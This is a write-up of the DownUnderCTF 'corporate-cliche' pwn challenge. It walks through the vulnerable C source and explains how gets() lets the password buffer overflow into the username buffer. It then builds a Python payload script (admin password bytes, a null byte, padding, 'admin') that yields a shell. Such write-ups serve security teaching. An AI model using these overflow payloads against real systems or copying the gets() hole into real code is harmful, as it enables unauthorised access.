# DownunderCTF corporate-cliche write-up

Type: Article

# corporate-cliche

![corp1.png](DownunderCTF%20zeus%20write-up%20237082343b3d809d9ee0cc78d6974cb9/corp1.png)

This challenge is a pwn challenge, the source code is provided in `email_server.c.` So, all we need to do is understand the code, find the vulnerability and write an exploit.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void open_admin_session() {
    printf("-> Admin login successful. Opening shell...\n");
    system("/bin/sh");
    exit(0);
}

void print_email() {
    printf(" ______________________________________________________________________\n");
    printf("| To:      all-staff@downunderctf.com                                  |\n");
    printf("| From:    synergy-master@downunderctf.com                             |\n");
    printf("| Subject: Action Item: Leveraging Synergies                           |\n");
    printf("|______________________________________________________________________|\n");
    printf("|                                                                      |\n");
    printf("| Per my last communication, I'm just circling back to action the      |\n");
    printf("| sending of this email to leverage our synergies. Let's touch base    |\n");
    printf("| offline to drill down on the key takeaways and ensure we are all     |\n");
    printf("| aligned on this new paradigm. Moving forward, we need to think       |\n");
    printf("| outside the box to optimize our workflow and get the ball rolling.   |\n");
    printf("|                                                                      |\n");
    printf("| Best,                                                                |\n");
    printf("| A. Manager                                                           |\n");
    printf("|______________________________________________________________________|\n");
    exit(0);
}

const char* logins[][2] = {
    {"admin", "🇦🇩🇲🇮🇳"},
    {"guest", "guest"},
};

int main() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    char password[32];
    char username[32];

    printf("┌──────────────────────────────────────┐\n");
    printf("│      Secure Email System v1.337      │\n");
    printf("└──────────────────────────────────────┘\n\n");

    printf("Enter your username: ");
    fgets(username, sizeof(username), stdin);
    username[strcspn(username, "\n")] = 0;

    if (strcmp(username, "admin") == 0) {
        printf("-> Admin login is disabled. Access denied.\n");
        exit(0);
    }

    printf("Enter your password: ");
    gets(password);

    for (int i = 0; i < sizeof(logins) / sizeof(logins[0]); i++) {
        if (strcmp(username, logins[i][0]) == 0) {
            if (strcmp(password, logins[i][1]) == 0) {
                printf("-> Password correct. Access granted.\n");
                if (strcmp(username, "admin") == 0) {
                    open_admin_session();
                } else {
                    print_email();
                }
            } else {
                printf("-> Incorrect password for user '%s'. Access denied.\n", username);
                exit(1);
            }
        }
    }
    printf("-> Login failed. User '%s' not recognized.\n", username);
    exit(1);
}

```

From the code, it appears that we need somehow to get to call `open_admin_session()` function, this function when called it will execute `system()` and since the argument of `system` is `/bin/sh` we guarantee it will return a shell. But wait, the `admin` login is disabled 🤔

```c
		printf("Enter your username: ");
    fgets(username, sizeof(username), stdin);
    username[strcspn(username, "\n")] = 0;

    if (strcmp(username, "admin") == 0) {
        printf("-> Admin login is disabled. Access denied.\n");
        exit(0);
    }
```

We control the input variable `username` . We can try to overflow it by writing more than what the buffer can handle; the buffer is only `32 bytes` long

```c
char password[32];
char username[32];

```

However, `fgets` function allows only up to `sizeof(username)`  which is 32 bytes. Hmmm? No buffer overflow here then. The problem is that the `if` statement checks if the username is `admin` if yes, it exits the code. That’s a painful statement. 

![corp2.png](DownunderCTF%20zeus%20write-up%20237082343b3d809d9ee0cc78d6974cb9/corp2.png)

We will need to find a way to bypass it later, but first let's find the real vulnerability. Let’s look at the password handling mechanism.

```c

printf("Enter your password: ");
gets(password);

for (int i = 0; i < sizeof(logins) / sizeof(logins[0]); i++) {
        if (strcmp(username, logins[i][0]) == 0) {
            if (strcmp(password, logins[i][1]) == 0) {
                printf("-> Password correct. Access granted.\n");
                if (strcmp(username, "admin") == 0) {
                    open_admin_session();
                } else {
                    print_email();
                }
            } else {
                printf("-> Incorrect password for user '%s'. Access denied.\n", username);
                exit(1);
            }
        }
    }
```

The loop loops over the logins structure and checks whether `username` = `logins[i][0]` and if `password = logins[i][1]` 

```c
const char* logins[][2] = {
    {"admin", "🇦🇩🇲🇮🇳"},
    {"guest", "guest"},
};

```

Hmmmm 🤔, that’s interesting because we can access it as a guest without any problem, but it only prints the email.

![corp3.png](DownunderCTF%20zeus%20write-up%20237082343b3d809d9ee0cc78d6974cb9/corp3.png)

Okay, noticed that the function used to get the password from the user is `gets()` This function is vulnerable because it doesn’t check the buffer bounds, it stops only when it sees a newline character `\n` i.e, when we hit `Enter.` Now we are talking; this is a buffer overflow vulnerability. Let’s try it.

![corp4.png](DownunderCTF%20zeus%20write-up%20237082343b3d809d9ee0cc78d6974cb9/corp4.png)

Superb!! The vulnerability is proven to be true; we just overwrote the content of `username` variable. Okay, now the first thing we should check is the possibility of overwritting the return address, we can check if security in the binary is disabled using `checksec` commend.

![Screenshot from 2025-07-21 18-47-04.png](DownunderCTF%20zeus%20write-up%20237082343b3d809d9ee0cc78d6974cb9/Screenshot_from_2025-07-21_18-47-04.png)

Unfortunately, the answer is no, it’s very hard to do with `RELRO` `NX` And `PIE` enabled, the  Global Offset Table (GOT) is read-only, and the binary is loaded into randomized locations within virtual memory each time the application is executed. {another door is closed} let's keep going.

Remember that we were able to overwrite the `username` If you are asking why? And how? Let me explain to you, because this seems to be our vulnerability that we are looking for, it all goes down to how function variables are stored in the memory `stack` To understand how a function’s variables are stored in the memory stack, let's look at a simple example:

```c
void function(int a, int b, int c) {
 char buffer1[5];
 char buffer2[10];
}
void main() {
 function(1,2,3);
}
```

The above function will be stored in the stack as follows:

```c
bottom of                                             top of memory
memory

         buffer2    buffer1   sfp  ret   a    b    c
<------ [          ][       ][   ][   ][   ][   ][   ]
stack   ^                    ^
grows   SP                   FP
down

top of                                                 bottom of stack 
stack 
```

For now, just focus on the top of the stack and the bottom of the stack. Whenever we write to a variable, we are writing from the top of the stack toward the bottom of the stack. That is to say, since `buffer2` is `10 bytes` long if we write `15 bytes` to it we will overwrite the content of `buffer1` it’s `10 + 5.` 

Hence, for our code, the stack will look like this:

```c
bottom of                                             top of memory
memory

         password    username   sfp  ret 
<------ [          ][        ][   ][   ]
stack   ^                     ^
grows   SP                    FP
down

top of                                                 bottom of stack 
stack 
```

since `password` buffer is `32 bytes` we will need to overwrite all the 32 bytes and just after that write `"admin"` ——> `A*32 + "admin"` 

![corp5.png](DownunderCTF%20zeus%20write-up%20237082343b3d809d9ee0cc78d6974cb9/corp5.png)

Great! we did it, we overflowed the password variable and successfully overwrite the value of `username` with `admin.` Now, all that left is to find a way to write the password of admin and change `usernname` to admin. It’s not straight forward because it should be like this `🇦🇩🇲🇮🇳 + offset + admin`

```c
password = "🇦🇩🇲🇮🇳" + junk (size of offset) + "admin"
```

first we need to find the size of the admin password, we need to convert it to hex, we will use `cyberchef` website [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)

![cyberchef.png](DownunderCTF%20zeus%20write-up%20237082343b3d809d9ee0cc78d6974cb9/cyberchef.png)

the size of the password in hex is `20 bytes` , therefore the exploit should be 

`20 bytes (password) + 12 bytes (junk) + admin` 

to build the exploit we can use either, `python -c` or `pwn library` but since the exploit is simple we are going to use `python -c`

```python
import sys
# admin password: 20-byte UTF-8 sequence for '🇦🇩🇲🇮🇳'
admin_pass = b"\xF0\x9F\x87\xA6\xF0\x9F\x87\xA9\xF0\x9F\x87\xB2\xF0\x9F\x87\xAE\xF0\x9F\x87\xB3"

# create the payload:
#   - 20 bytes: admin password
#   - 12 bytes: Padding ('A' * 12)
#   - 5 bytes: "admin"
password_payload = admin_pass + b"A" * 12 + b"admin"

# Send the exploit:
#   - Username: "guest" (any non-admin username)
#   - Password: Constructed payload
sys.stdout.buffer.write(b"guest\n") # send username
sys.stdout.buffer.write(password_payload + b"\n") # fill admin password and overwrite usename with "admin"

```

![Screenshot from 2025-07-21 15-18-10.png](DownunderCTF%20zeus%20write-up%20237082343b3d809d9ee0cc78d6974cb9/Screenshot_from_2025-07-21_15-18-10.png)

it works but the password is incorrect because the password now  is `🇦🇩🇲🇮🇳AAAAAAA...`  we need to end `password` buffer after the right password is filled. In `C` the char buffer ends with a `null` byte `\0` which is equivalent to `\x00` in hex. Hence, our exploit will become `admin_password + '\x00' + 'A'*11 + 'admin`

```python
import sys
# admin password: 20-byte UTF-8 sequence for '🇦🇩🇲🇮🇳'
admin_pass = b"\xF0\x9F\x87\xA6\xF0\x9F\x87\xA9\xF0\x9F\x87\xB2\xF0\x9F\x87\xAE\xF0\x9F\x87\xB3"

# create the payload:
#   - 20 bytes: admin password
#   - 12 bytes: Padding ('A' * 12)
#   - 5 bytes: "admin"
password_payload = admin_pass + b"\x00" + b"A" * 11 + b"admin"

# Send the exploit:
#   - Username: "guest" (any non-admin username)
#   - Password: Constructed payload
sys.stdout.buffer.write(b"guest\n") # send username
sys.stdout.buffer.write(password_payload + b"\n") # fill admin password and overwrite usename with "admin"

```

![Screenshot from 2025-07-21 15-25-16.png](DownunderCTF%20zeus%20write-up%20237082343b3d809d9ee0cc78d6974cb9/Screenshot_from_2025-07-21_15-25-16.png)

Finally, we successfully exploited the program, but we didn’t get the shell unfortunately. Hmmmm, there must be a reason the program is exiting without dropping a shell, because I’m sure our `system(”/bin/sh”)` is executed. After looking and asking LLMs i found this problem

> The issue you're facing—where the program outputs *"Admin login successful. Opening shell..."* but then exits without dropping you into a shell—is likely due to how you're piping the output of your Python script (`exploit.py`) directly into the `email_server` binary
> 

> This piping method (`|`) **only sends `stdout`** (standard output) from `exploit.py` into `stdin` of `email_server`, but **does not connect their input/output streams bidirectionally**. So even if the exploit successfully gets code execution, you won't get an interactive shell because:
> 
> 1. The shell (`/bin/sh` or similar) expects an interactive TTY or a fully functional stdin/stdout stream.
> 2. The pipe setup does not allow interactive communication—**you can't send input back to the spawned shell**, and you won't see its output either.
> 
> Hmm!, I didn’t understand exactly but i think when `python [exploit.py](http://exploit.py)` finishes sending data, it sends `EOF` and it closes its `stdout` which results in exiting the program. Therefore, we need to find a way to keep the terminal alive to get its `stdout` (the shell), the LLM suggests using `cat -` in the end of pipe first half, it’s a cleaver idea.
> 

![Screenshot from 2025-07-21 15-41-03.png](DownunderCTF%20zeus%20write-up%20237082343b3d809d9ee0cc78d6974cb9/Screenshot_from_2025-07-21_15-41-03.png)

Yup, it worked, and we got the shell and flag.
